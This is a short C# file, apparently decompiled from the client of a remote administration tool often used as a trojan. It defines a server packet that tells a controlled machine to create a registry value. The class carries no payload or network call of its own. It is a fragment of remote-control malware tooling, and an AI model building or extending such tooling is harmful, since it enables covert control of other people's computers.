using System;
using Microsoft.Win32;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoCreateRegistryValue : GInterface4
{
	public string KeyPath { get; set; }

	public RegistryValueKind Kind { get; set; }

	public DoCreateRegistryValue(string keyPath, RegistryValueKind kind)
	{
		KeyPath = keyPath;
		Kind = kind;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
